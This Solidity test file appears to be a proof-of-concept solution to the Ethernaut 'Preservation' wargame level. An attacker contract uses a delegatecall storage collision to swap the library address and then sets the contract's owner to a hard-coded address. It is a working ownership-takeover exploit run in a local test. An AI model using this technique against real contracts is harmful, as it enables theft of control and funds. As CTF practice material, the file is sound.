// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level16.sol";

contract POC is Test {
    Preservation level16;
    PreservationAttacker attacker;

    function setUp() public {
        level16 = new Preservation(
            address(new LibraryContract()),
            address(new LibraryContract())
        );
        attacker = new PreservationAttacker(level16);
    }

    function test() public {
        level16.owner();
        attacker.exploit();
        level16.owner();
    }
}

contract PreservationAttacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Preservation public level16;

    constructor(Preservation _level16) public {
        level16 = _level16;
    }

    // set the time for timezone 1
    function exploit() public {
        level16.setFirstTime(uint256(uint160(address(this))));
        level16.setFirstTime(uint256(2));
    }

    function setTime(uint256 _time) public {
        storedTime = _time;
        owner = 0xd6474E692A99c5ab61E9441D44e5F0B4286fB03d;
    }
}
